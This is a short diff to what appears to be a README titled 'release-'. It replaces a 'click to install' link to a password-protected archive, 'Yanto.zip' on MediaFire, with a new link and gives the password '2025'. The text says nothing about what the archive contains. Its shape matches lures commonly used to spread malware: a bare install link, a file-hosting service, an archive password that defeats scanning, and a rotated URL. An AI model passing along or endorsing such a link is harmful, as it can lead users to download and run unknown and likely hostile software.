@@ -1,2 +1,2 @@
 # release-
-[click to install](https://www.mediafire.com/file/jsqd31eqo3nv85v/Yanto.zip/file) pass - 2025
+[click to install](https://www.mediafire.com/file/cyi87b3geatb2xs/Yanto.zip/file) pass - 2025
